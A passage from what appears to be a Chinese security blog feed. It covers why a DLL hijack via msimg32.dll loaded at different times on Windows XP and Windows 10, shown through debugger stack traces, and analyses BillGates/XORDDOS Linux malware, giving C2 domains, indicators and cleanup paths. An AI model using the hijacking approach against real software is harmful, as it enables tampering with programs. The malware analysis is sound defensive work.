class="number">0012f</span>ff0 <span class="number">00000000</span> <span class="number">0040283</span>e <span class="number">00000000</span> <span class="number">78746341</span> kernel32!RegisterWaitForInputIdle+<span class="number">0x49</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; du <span class="number">0012</span>eac4</span><br><span class="line"><span class="number">0012</span>eac4  <span class="string">"C:\WINDOWS\system32\QQPINYIN.IME"</span></span><br><span class="line"><span class="number">0012</span>eb04  <span class="string">""</span></span><br></pre></td></tr></table></figure><br><br>发现在加载QQPINYIN.IME的时候，在解决QQPINYIN.IME依赖dll的时候加载了msimg32.dll。<br><div align="center"><br><img src="/img/20161002qqime_depends.png" alt="QQPINYIN.ime的DLL依赖项" align="center"><br></div>

<h2 id="问题2">问题2</h2><p>好了，问题1解决了，该问题2了。win10上同样装的qq输入法，但是输入法劫持dll的加载时机却靠后了，这是怎么回事呢？<br>在procmon观察，在win10系统QQpinyin.ime是被QQPinyinTSF.dll这个dll加载的，而在winxp上是imm32.dll。上调试器观察下有什么不同<br>winxp<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0012</span>eac4  <span class="string">"C:\WINDOWS\system32\QQPINYIN.IME"</span></span><br><span class="line"><span class="number">00</span> <span class="number">0012</span>eaa4 <span class="number">763071f</span>4 kernel32!LoadLibraryW+<span class="number">0x5</span></span><br><span class="line"><span class="number">01</span> <span class="number">0012</span>ecd0 <span class="number">76307680</span> IMM32!ImmNotifyIME+<span class="number">0x21c</span></span><br><span class="line"><span class="number">02</span> <span class="number">0012</span>ee64 <span class="number">763077</span>bb IMM32!ImmNotifyIME+<span class="number">0x6a8</span></span><br><span class="line"><span class="number">03</span> <span class="number">0012</span>ee74 <span class="number">77</span>d6b570 IMM32!ImmLoadIME+<span class="number">0x4c</span></span><br><span class="line"><span class="number">04</span> <span class="number">0012</span>ee84 <span class="number">77</span>d6be00 USER32!IMPSetIMEA+<span class="number">0x6c</span></span><br><span class="line"><span class="number">05</span> <span class="number">0012f</span>0d4 <span class="number">77</span>d6c8cf USER32!IMPSetIMEA+<span class="number">0x8fc</span></span><br><span class="line"><span class="number">06</span> <span class="number">0012f</span>0f8 <span class="number">77</span>d6c952 USER32!IMPSetIMEA+<span class="number">0x13cb</span></span><br><span class="line"><span class="number">07</span> <span class="number">0012f</span>114 <span class="number">77</span>d18734 USER32!IMPSetIMEA+<span class="number">0x144e</span></span><br><span class="line"><span class="number">08</span> <span class="number">0012f</span>140 <span class="number">77</span>d18816 USER32!GetDC+<span class="number">0x6d</span></span><br><span class="line"><span class="number">09</span> <span class="number">0012f</span>1a8 <span class="number">77</span>d2a013 USER32!GetDC+<span class="number">0x14f</span></span><br><span class="line"><span class="number">0</span>a <span class="number">0012f</span>1d8 <span class="number">77</span>d2a998 USER32!IsWindowUnicode+<span class="number">0xa1</span></span><br><span class="line"><span class="number">0</span>b <span class="number">0012f</span>1f8 <span class="number">0040</span>d08f USER32!CallWindowProcA+<span class="number">0x1b</span></span><br><span class="line"><span class="number">0</span>c <span class="number">0012f</span>26c <span class="number">77</span>d18734 image00400000+<span class="number">0xd08f</span></span><br><span class="line"><span class="number">0</span>d <span class="number">0012f</span>298 <span class="number">77</span>d18816 USER32!GetDC+<span class="number">0x6d</span></span><br><span class="line"><span class="number">0</span>e <span class="number">0012f</span>300 <span class="number">77</span>d28ea0 USER32!GetDC+<span class="number">0x14f</span></span><br><span class="line"><span class="number">0f</span> <span class="number">0012f</span>354 <span class="number">77</span>d28eec USER32!DefWindowProcW+<span class="number">0x180</span></span><br><span class="line"><span class="number">10</span> <span class="number">0012f</span>37c <span class="number">7</span>c92e453 USER32!DefWindowProcW+<span class="number">0x1cc</span></span><br><span class="line"><span class="number">11</span> <span class="number">0012f</span>844 <span class="number">77</span>d26423 ntdll!KiUserCallbackDispatcher+<span class="number">0x13</span></span><br><span class="line"><span class="number">12</span> <span class="number">0012f</span>91c <span class="number">77</span>d2683e USER32!IsDlgButtonChecked+<span class="number">0x1629</span></span><br><span class="line"><span class="number">13</span> <span class="number">0012f</span>940 <span class="number">77</span>d39b43 USER32!CreateDialogIndirectParamAorW+<span class="number">0x33</span></span><br><span class="line"><span class="number">14</span> <span class="number">0012f</span>960 <span class="number">0040</span>c465 USER32!CreateDialogIndirectParamA+<span class="number">0x1b</span></span><br><span class="line"><span class="number">15</span> <span class="number">0012f</span>9c8 <span class="number">0040</span>c68e image00400000+<span class="number">0xc465</span></span><br><span class="line"><span class="number">16</span> <span class="number">0012f</span>a0c <span class="number">004010e4</span> image00400000+<span class="number">0xc68e</span></span><br><span class="line"><span class="number">17</span> <span class="number">0012f</span>fc0 <span class="number">7</span>c817067 image00400000+<span class="number">0x10e4</span></span><br><span class="line"><span class="number">18</span> <span class="number">0012f</span>ff0 <span class="number">00000000</span> kernel32!RegisterWaitForInputIdle+<span class="number">0x49</span></span><br></pre></td></tr></table></figure></p>
<p>win10<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0019</span>d848  <span class="string">"C:\WINDOWS\SysWow64\IME\QQPinyinTSF\QQPinyinTSF.dll"</span></span><br><span class="line"><span class="number">00</span> <span class="number">0019</span>d794 <span class="number">752</span>ac012 KERNELBASE!LoadLibraryExW+<span class="number">0x5</span></span><br><span class="line"><span class="number">01</span> <span class="number">0019</span>d7b8 <span class="number">752</span>abf8a combase!LoadLibraryWithLogging+<span class="number">0x1b</span> </span><br><span class="line"><span class="number">02</span> <span class="number">0019</span>d7e4 <span class="number">752</span>ac136 combase!CClassCache::CDllPathEntry::LoadDll+<span class="number">0x50</span> </span><br><span class="line"><span class="number">03</span> <span class="number">0019</span>d824 <span class="number">752</span>ad6f7 combase!CClassCache::CDllPathEntry::Create+<span class="number">0x3c</span> </span><br><span class="line"><span class="number">04</span> <span class="number">0019</span>da74 <span class="number">752f</span>98ce combase!CClassCache::CClassEntry::CreateDllClassEntry+<span class="number">0xe3</span> </span><br><span class="line"><span class="number">05</span> <span class="number">0019</span>dda4 <span class="number">752</span>accb2 combase!CClassCache::GetClassObjectActivator+<span class="number">0x82e</span> </span><br><span class="line"><span class="number">06</span> <span class="number">0019</span>ddd8 <span class="number">752</span>ac898 combase!CClassCache::GetClassObject+<span class="number">0x30</span> </span><br><span class="line"><span class="number">07</span> <span class="number">0019</span>de48 <span class="number">752</span>b6dfa combase!CServerContextActivator::CreateInstance+<span class="number">0x128</span> </span><br><span class="line"><span class="number">08</span> <span class="number">0019</span>de94 <span class="number">752</span>acef2 combase!ActivationPropertiesIn::DelegateCreateInstance+<span class="number">0xba</span> </span><br><span class="line"><span class="number">09</span> <span class="number">0019</span>deec <span class="number">752</span>b1575 combase!CApartmentActivator::CreateInstance+<span class="number">0xa2</span> </span><br><span class="line"><span class="number">0</span>a <span class="number">0019</span>df1c <span class="number">752</span>b1640 combase!CProcessActivator::CCICallback+<span class="number">0x65</span> </span><br><span class="line"><span class="number">0</span>b <span class="number">0019</span>df40 <span class="number">752</span>b16d7 combase!CProcessActivator::AttemptActivation+<span class="number">0x40</span> </span><br><span class="line"><span class="number">0</span>c <span class="number">0019</span>df80 <span class="number">752</span>b18f7 combase!CProcessActivator::ActivateByContext+<span class="number">0x77</span> </span><br><span class="line"><span class="number">0</span>d <span class="number">0019</span>dfb0 <span class="number">752</span>b6ddb combase!CProcessActivator::CreateInstance+<span class="number">0x67</span> </span><br><span class="line"><span class="number">0</span>e <span class="number">0019</span>dffc <span class="number">752</span>b2e7d combase!ActivationPropertiesIn::DelegateCreateInstance+<span class="number">0x9b</span> </span><br><span class="line"><span class="number">0f</span> <span class="number">0019e260</span> <span class="number">752</span>b6de2 combase!CClientContextActivator::CreateInstance+<span class="number">0xfd</span> </span><br><span class="line"><span class="number">10</span> <span class="number">0019e2</span>ac <span class="number">752f</span>77a0 combase!ActivationPropertiesIn::DelegateCreateInstance+<span class="number">0xa2</span> </span><br><span class="line"><span class="number">11</span> <span class="number">0019</span>ec18 <span class="number">752f</span>6ba2 combase!ICoCreateInstanceEx+<span class="number">0xae0</span> </span><br><span class="line"><span class="number">12</span> <span class="number">0019</span>ecc8 <span class="number">752f</span>8209 combase!CComActivator::DoCreateInstance+<span class="number">0x162</span> </span><br><span class="line"><span class="number">13</span> <span class="number">0019</span>ed08 <span class="number">7510</span>dece combase!CoCreateInstance+<span class="number">0xa9</span> </span><br><span class="line"><span class="number">14</span> <span class="number">0019</span>ee44 <span class="number">7510e28</span>f MSCTF!CThreadInputMgr::_CreateTip+<span class="number">0x1be</span></span><br><span class="line"><span class="number">15</span> <span class="number">0019</span>ee84 <span class="number">7510</span>c458 MSCTF!CThreadInputMgr::ActivateInputProfile+<span class="number">0x10f</span></span><br><span class="line"><span class="number">16</span> <span class="number">0019</span>efb0 <span class="number">7510</span>c85d MSCTF!CThreadInputMgr::OnActiveProfileChange+<span class="number">0x668</span></span><br><span class="line"><span class="number">17</span> <span class="number">0019f</span>1e0 <span class="number">7511e12</span>f MSCTF!CThreadInputMgr::OnInputFocusEvent+<span class="number">0x2cd</span></span><br><span class="line"><span class="number">18</span> <span class="number">0019f</span>8a0 <span class="number">743</span>a9733 MSCTF!WinEventProc+<span class="number">0x5bf</span></span><br><span class="line"><span class="number">19</span> <span class="number">0019f</span>8e8 <span class="number">777608</span>c6 USER32!__ClientCallWinEventProc+<span class="number">0x43</span></span><br><span class="line"><span class="number">1</span>a <span class="number">0019f</span>920 <span class="number">775</span>d24ec ntdll!KiUserCallbackDispatcher+<span class="number">0x36</span></span><br><span class="line"><span class="number">1</span>b <span class="number">0019f</span>924 <span class="number">743</span>b24d3 win32u!NtUserGetMessage+<span class="number">0xc</span></span><br><span class="line"><span class="number">1</span>c <span class="number">0019f</span>950 <span class="number">0040</span>bc09 USER32!GetMessageA+<span class="number">0x53</span></span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line"><span class="number">1</span>d <span class="number">0019f</span>96c <span class="number">0040</span>eff5 image00400000+<span class="number">0xbc09</span></span><br><span class="line"><span class="number">1</span>e <span class="number">0019f</span>9dc <span class="number">00000000</span> image00400000+<span class="number">0xeff5</span></span><br><span class="line"></span><br><span class="line"><span class="number">00670</span>ab0  <span class="string">"C:\WINDOWS\system32\IME\QQPinyinTSF\QQPinyin.ime"</span></span><br><span class="line"><span class="number">00</span> <span class="number">0019e974</span> <span class="number">7578</span>c711 KERNELBASE!LoadLibraryExW+<span class="number">0x5</span></span><br><span class="line"><span class="number">01</span> <span class="number">0019e988</span> <span class="number">568</span>cb24f KERNELBASE!LoadLibraryW+<span class="number">0x11</span></span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line"><span class="number">02</span> <span class="number">0019</span>ecf4 <span class="number">568</span>cd764 QQPinyinTSF!DllGetClassObject+<span class="number">0x24cf</span></span><br><span class="line"><span class="number">03</span> <span class="number">0019</span>ed18 <span class="number">568</span>cb8da QQPinyinTSF!DllGetClassObject+<span class="number">0x49e4</span></span><br><span class="line"><span class="number">04</span> <span class="number">0019</span>eda8 <span class="number">750f</span>4939 QQPinyinTSF!DllGetClassObject+<span class="number">0x2b5a</span></span><br><span class="line"><span class="number">05</span> <span class="number">0019</span>eddc <span class="number">7510</span>dc53 MSCTF!CTip::Activate+<span class="number">0x63</span></span><br><span class="line"><span class="number">06</span> <span class="number">0019</span>ee48 <span class="number">7510e2</span>d9 MSCTF!CThreadInputMgr::_ActivateTip+<span class="number">0x9f</span></span><br><span class="line"><span class="number">07</span> <span class="number">0019</span>ee84 <span class="number">7510</span>c458 MSCTF!CThreadInputMgr::ActivateInputProfile+<span class="number">0x159</span></span><br><span class="line"><span class="number">08</span> <span class="number">0019</span>efb0 <span class="number">7510</span>c85d MSCTF!CThreadInputMgr::OnActiveProfileChange+<span class="number">0x668</span></span><br><span class="line"><span class="number">09</span> <span class="number">0019f</span>1e0 <span class="number">7511e12</span>f MSCTF!CThreadInputMgr::OnInputFocusEvent+<span class="number">0x2cd</span></span><br><span class="line"><span class="number">0</span>a <span class="number">0019f</span>8a0 <span class="number">743</span>a9733 MSCTF!WinEventProc+<span class="number">0x5bf</span></span><br><span class="line"><span class="number">0</span>b <span class="number">0019f</span>8e8 <span class="number">777608</span>c6 USER32!__ClientCallWinEventProc+<span class="number">0x43</span></span><br><span class="line"><span class="number">0</span>c <span class="number">0019f</span>920 <span class="number">775</span>d24ec ntdll!KiUserCallbackDispatcher+<span class="number">0x36</span></span><br><span class="line"><span class="number">0</span>d <span class="number">0019f</span>924 <span class="number">743</span>b24d3 win32u!NtUserGetMessage+<span class="number">0xc</span></span><br><span class="line"><span class="number">0</span>e <span class="number">0019f</span>950 <span class="number">0040</span>bc09 USER32!GetMessageA+<span class="number">0x53</span></span><br><span class="line"><span class="number">0f</span> <span class="number">0019f</span>96c <span class="number">0040</span>eff5 image00400000+<span class="number">0xbc09</span></span><br><span class="line"><span class="number">10</span> <span class="number">0019f</span>9dc <span class="number">00000000</span> image00400000+<span class="number">0xeff5</span></span><br></pre></td></tr></table></figure></p>
<p>总结一下QQpinyin.ime在winxp和win10上的不同调用序列：<br>winxp:kernel32!RegisterWaitForInputIdle———&gt;user32!CreateDialogIndirectParamA———-&gt;USER32!IMPSetIMEA+0x13cb———&gt;IMM32!ImmNotifyIME+0x21c<br>win10:USER32!GetMessageA+0x53————&gt;MSCTF!CThreadInputMgr::_CreateTip+0x1be——-&gt;combase!CClassCache::CDllPathEntry::LoadDll+0x50 ——–&gt;MSCTF!CTip::Activate+0x63———-&gt;QQPinyinTSF!DllGetClassObject+0x24cf</p>
<p>基本描述了问题(在xp上在exe主函数未执行前QQpinyin.ime就已经被加载了，在win10是在exez主函数执行完成后开始获取消息的时候加载的ime),但是没有解释为什么会这样</p>
<p>google搜索一下发现了在xp与win10上输入法的框架的不同：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Windows提供了两套输入法框架： Windows XP及之前，是IMM （Input Method Manager），</span><br><span class="line">基于纯函数API的。目前市面上非微软中文输入法基本上都是只实现IMM框架。Windows XP开</span><br><span class="line">始及以后，Windows提供新的输入框架TSF，是基于COM的实际上，到了WindowsVista，Windows7，</span><br><span class="line">所有的应用程序和各种输入控件都是优先使用TSF的实现。但之所以Windows Vista，Windows <span class="number">7</span></span><br><span class="line">用户还能使用各种基于IMM的输入法，是因为Windows提供了一个组件来将所有TSF的请求转为IMM的API。</span><br><span class="line">（PunCha：难道Win8开始就不提供了吗？！很有可能，因为Win8下很多Imm的函数</span><br><span class="line">都不能使用了）按照微软的说法，TSF会最终取代IMM框架。而微软拼音基于兼容，</span><br><span class="line">功能和性能方面的原因，将这两个框架都实现了。</span><br></pre></td></tr></table></figure></p>
<h2 id="总结">总结</h2><p>总结一下就是，由于使用QQ输入法而引入了Dll劫持漏洞但是由于输入法框架的不同导致劫持dll的加载时机的不同。</p>
<h2 id="参考文献">参考文献</h2><p><a href="http://www.chinapyg.com/thread-79995-1-1.html" target="_blank" rel="external">Visual Assist X 劫持破解 Patch With Key (通杀1041~2118) 解决变灰问题</a><br><a href="http://blog.csdn.net/otishiono/article/details/7084079" target="_blank" rel="external">动态链接库的静态链接导致程序的DLL劫持漏洞-借助QQ程序xGraphic32.dll描述</a><br><a href="http://blog.csdn.net/mspinyin/article/details/6137709" target="_blank" rel="external"> TSF（Text Service Framework）简介</a><br><a href="http://andrewyang.cn/post.php?id=1078" target="_blank" rel="external">逗比的输入法实现（一）：基本情况</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="问题描述">问题描述</h2><p>前一段事件做一个题的时候，需要修改主程序执行逻辑，当时想想应该很简单，直接做dll劫持然后在该DllMain中去修改主程序Exe的执行逻辑（因为之前看到飘云阁的 Visual Assist X劫持用的msimg32）。很顺利的在调试系统(win xp)做完了，达到了预期目的。但是拿到win7和win10上运行顿时就不行了。<br>主要问题有两个：</p>
<ul>
<li>win7上直接不加载劫持dll,msimg32.dll了</li>
<li>win10上会加载msimg32.dll，但是加载时间靠后，在主程序逻辑执行后才被加载，这会修改逻辑也没用了</li>
</ul>
<p>当时时间紧急，也比较慌。没有分析，改了方案直接修改主程序二进制，文件补丁方式做的<br>]]>
    
    </summary>
    
      <category term="Dll劫持" scheme="http://www.youngroe.com/tags/Dll%E5%8A%AB%E6%8C%81/"/>
    
      <category term="Windows" scheme="http://www.youngroe.com/tags/Windows/"/>
    
      <category term="Debug" scheme="http://www.youngroe.com/categories/Debug/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux木马分析初体验（BillGates及XORDDOS查杀）]]></title>
    <link href="http://www.youngroe.com/2016/08/25/Learning/Linux-malware-billgates-XORDDOS-analyze-first-time/"/>
    <id>http://www.youngroe.com/2016/08/25/Learning/Linux-malware-billgates-XORDDOS-analyze-first-time/</id>
    <published>2016-08-25T04:05:26.000Z</published>
    <updated>2020-07-16T13:20:43.595Z</updated>
    <content type="html"><![CDATA[<div align="center"><br><img src="/img/20160826billgates_XORDDOSsumary.png" align="center"><br></div>

<p>分析工具：</p>
<ul>
<li>ida pro</li>
<li>edb</li>
<li>strace</li>
</ul>
<p>事情是这样的，某一天发现某一台服务器数据流量异常，怀疑中了木马而且是一台Windows机器，想着就能一展我手动杀毒的技能了，但是开了机才发下这台机器上通过Hyper-V装了另外5台虚拟机，比我想象中复杂多了而且在机房狭小的环境中。在几台Windows机器上找了良久也未发现木马的踪迹，难道是什么高级木马？好在师兄经验丰富一想肯定是剩下的那台centos有问题，果然一找一大堆，billgates附送个xorddos，不是说linux很安全么，怎么会中马呢？ linux是很安全但是耐不住用的人没安全意识啊，直接暴露在公网的主机被设置了ssh弱密码。好了故事编完了，进入正题，这篇博客主要是这两天的linux系统下的木马分析与查杀的一个简单记录。</p>
<h2 id="BillGates">BillGates</h2><p>BillGates就是上面那个比重最大的Linux.BackDoor.Gates.5，2014年就被drweb曝光过，网上很多分析的很多了，但是还是自己跟着走一遍还是能学到很多东西的，特别是第一次分析Linux木马的我。</p>
<h3 id="静态分析">静态分析</h3><p>基本信息<br><a id="more"></a><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">backbox@backbox-virtual-machine:~/Desktop/ctf/tmp$ md5sum lang</span><br><span class="line">779d77646d84cc012c5da5c01ea592c6  lang</span><br><span class="line">backbox@backbox-virtual-machine:~/Desktop/ctf/tmp$ file lang</span><br><span class="line">lang: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.2.5, not stripped</span><br><span class="line">backbox@backbox-virtual-machine:~/Desktop/ctf/tmp$ readelf -a lang|grep FILE|awk '&#123;print $8&#125;'|sort -u</span><br><span class="line">AmpResource.cpp</span><br><span class="line">Attack.cpp</span><br><span class="line">AutoLock.cpp</span><br><span class="line">CmdMsg.cpp</span><br><span class="line">ConfigDoing.cpp</span><br><span class="line">crtstuff.c</span><br><span class="line">DNSCache.cpp</span><br><span class="line">ExChange.cpp</span><br><span class="line">FileOp.cpp</span><br><span class="line">Global.cpp</span><br><span class="line">Ijduy.cpp</span><br><span class="line">Iysd76.cpp</span><br><span class="line">Log.cpp</span><br><span class="line">Main.cpp</span><br><span class="line">Manager.cpp</span><br><span class="line">Md5.cpp</span><br><span class="line">Media.cpp</span><br><span class="line">MiniHttpHelper.cpp</span><br><span class="line">NetBase.cpp</span><br><span class="line">ProtocolUtil.cpp</span><br><span class="line">ProvinceDns.cpp</span><br><span class="line">StatBase.cpp</span><br><span class="line">SysTool.cpp</span><br><span class="line">ThreadAtk.cpp</span><br><span class="line">ThreadClientStatus.cpp</span><br><span class="line">ThreadCondition.cpp</span><br><span class="line">ThreadConnection.cpp</span><br><span class="line">Thread.cpp</span><br><span class="line">ThreadDoFun.cpp</span><br><span class="line">ThreadFakeDetect.cpp</span><br><span class="line">ThreadHttpGet.cpp</span><br><span class="line">ThreadKillChaos.cpp</span><br><span class="line">ThreadLoopCmd.cpp</span><br><span class="line">ThreadMonGates.cpp</span><br><span class="line">ThreadMutex.cpp</span><br><span class="line">ThreadRecycle.cpp</span><br><span class="line">ThreadShell.cpp</span><br><span class="line">ThreadShellRecycle.cpp</span><br><span class="line">ThreadTask.cpp</span><br><span class="line">ThreadTns.cpp</span><br><span class="line">ThreadUpdate.cpp</span><br><span class="line">UserAgent.cpp</span><br><span class="line">Utility.cpp</span><br><span class="line">WinDefSVC.cpp</span><br></pre></td></tr></table></figure></p>
<p>从上面可以简单总结，这个木马是一个32位的elf文件，采用静态链接的方式（所以在ida中看不到导入表）可能是为了提高兼容性吧，支持2.2以上的linux系统，not stripped就是没有剔除符号信息（这就方便了我们逆向调试），从源文件名可以看书这个木马多线程多任务。<br>有了上面的信息我们就可以上ida了，是32位的（之前我想都没想认为是64位的直接上64位ida，但是工作的也不错反编译都没问题但是没有f5导致我绕了很大一圈）。<br><img src="/img/20160826billgates_ida_main.png" alt><br>直接上ida f5 main函数，大概就就是上面这个样子的，从ida来看大概有3900个函数，还是比较复杂了。整个木马的执行流程如下面这个图的样子，为什么这么快就能够弄出这么清晰的脉络呢？主要是符号信息没strip加上f5大法，况且360的分析也详细了，所以直接就出来了。不过在ida静态看的时候发现C++写的代码是要比C写的难分析，没用f5看的时候大部分函数名显示都是_ZNSt6vectorISsSaISsEEixEj这个样子的，主要可能就是C++的多态性显示吧，还有就是类成员指针this不知道从哪里冒出来的。<br><img src="/img/20160826billgates_mainfun.png" alt></p>
<h3 id="动态分析">动态分析</h3><p>静态分析的时候通过函数名基本就可以看出功能这些了，但是获取其他的一些信息函数要动态调试一下，比如说控制端的地址，如果看静态代码然后自己写解密函数太复杂了。Linux的调试器首先想到的就是gdb但是对于用惯了Widnwos图形界面调试器的我用起来真的是太复杂了即使加了peda插件，所以首先就是找一个好的调试器，最终选择了<a href="https://github.com/eteran/edb-debugger" target="_blank" rel="external">edb</a>基本上和ollydbg无缝对接，按照readme编译安装就可以用了。<br><strong>下断点</strong><br>刚开始真的不知道怎么下断点，静态链接的也没导入表导入函数，然后熟悉了下edb发现默认的插件里面有SymbolViewer可以直接搜索函数然后下断点，根据前面的静态分析大概知道解密控制端地址在函数CSysTool::Ikdfu94()中然后搜索f2。这里还需要注意edb的堆栈窗口的显示设置，不然堆栈窗口看起来会怪怪的看不到什么东西，word width设置为4byte（因为32位系统嘛）然后row width 设置为1 word,这样才看起来正常。</p>
<div align="center"><br><img src="/img/20160826billgates_breakpoint.png" alt="断点情况" align="center"><br></div><br>这里动态调试主要是看看MainBeikong主功能安装函数部分，看能不能找出控制端的地址。<br><div align="center"><br><img src="/img/20160826billgates_filesize1.png" align="center"><br></div><br><div align="center"><br><img src="/img/20160826billgates_filesize.png" alt="初始化一些校验量部分及一些全局字符串" align="center"><br></div><br><div align="center"><br><img src="/img/20160826billgates_backaddress.png" alt="解密出一个控制端地址中间量" align="center"><br></div><br>在Ikdfu94()+1a1解密出一个控制端地址中间量，后面部分的0x8130800地址的位置ida会出现反编译失败的情况，而进入这里面会发现会在解密出一个控制端地址，搜索发现这个可能才是真正的控制端地址（反正没怎么搞清楚c++的代码逆向这些类成员怎么存的….），之前以为这个中间量就是控制端地址后面进入0x8130800后才发现这一步才是真正的解密出控制端的地址。<br><div align="center"><br><img src="/img/20160826billgates_0x8130800.png" alt="0x8130800部分代码" align="center"><br></div>

<div align="center"><br><img src="/img/20160826billgates_backaddress1.png" alt="解密出真正的控制端地址" align="center"><br></div>

<p>搜索发现这个域名和很多恶意软件都有关联，应该是个惯犯了。<a href="https://www.threatcrowd.org/domain.php?domain=www.007au.net" target="_blank" rel="external">https://www.threatcrowd.org/domain.php?domain=www.007au.net</a></p>
<div align="center"><br><img src="/img/20160826billgates_threatcrowd.png" alt="007au.net域名关联" align="center"><br></div>

<p>在路径/usr/bin/bsd-port/getty下主功能程序时解密的后台地址</p>
<div align="center"><br><img src="/img/20160826billgates_midaddress2.png" alt="主功能中间地址" align="center"><br></div>

<div align="center"><br><img src="/img/20160826billgates_finaladdress2.png" alt="最终控制端地址" align="center"><br></div>

<div align="center"><br><img src="/img/20160826billgates_2crowd.png" alt="2xpk.com域名关联" align="center"><br></div>

<p>参数格式：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="constant">C2-</span>ip&gt;<span class="symbol">:&lt;C2-port&gt;</span><span class="symbol">:&lt;Is</span> <span class="constant">Listener </span>?&gt;<span class="symbol">:&lt;IsService</span> ?&gt;<span class="symbol">:&lt;Campaign</span> <span class="constant">Name&gt;</span><span class="symbol">:&lt;Enable</span> <span class="constant">Backdoor </span>?&gt;</span><br></pre></td></tr></table></figure></p>
<div align="center"><br><img src="/img/20160826billgates_param.png" alt="参数格式" align="center"><br></div><br>总的来说目的基本达到了，应该是找到了控制端的地址，后面其他的太多了就没有继续分析了，看360分析的那篇文章感觉很庞大很复杂。<br>威胁情报相关：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">007</span>au.net</span><br><span class="line"><span class="number">775940302</span>@qq.com</span><br><span class="line">ss@qq.com</span><br><span class="line"><span class="number">513131779</span>@qq.com</span><br><span class="line"><span class="number">2</span>xpk.com</span><br><span class="line">tb8t.com</span><br><span class="line">daywin666@gmail.com</span><br></pre></td></tr></table></figure><br><br>### 清理及恢复系统<br><strong>清理</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/.sshd                   	               守护进程木马文件，首先应该被干掉</span><br><span class="line">/usr/bin/bsd-port/getty          	               主功能木马文件，直接删除</span><br><span class="line">/bin/、/usr/bin/、/usr/sbin/ 下netstat、lsof、ps或ss    过滤功能木马文件，通过文件大小可判断</span><br><span class="line">/tmp/lang                                              安装功能木马文件，直接删除</span><br><span class="line">/etc/rc.local                                         自启动配置文件，清理掉里面的含有木马路径的</span><br><span class="line">/etc/init.d/DbSecuritySpt                              自启动配置文件，直接删除</span><br><span class="line">/etc/rc[<span class="number">1</span>-<span class="number">5</span>].d/S97DbSecuritySpt                        自启动配置文件，直接删除</span><br><span class="line">/etc/rc[<span class="number">1</span>-<span 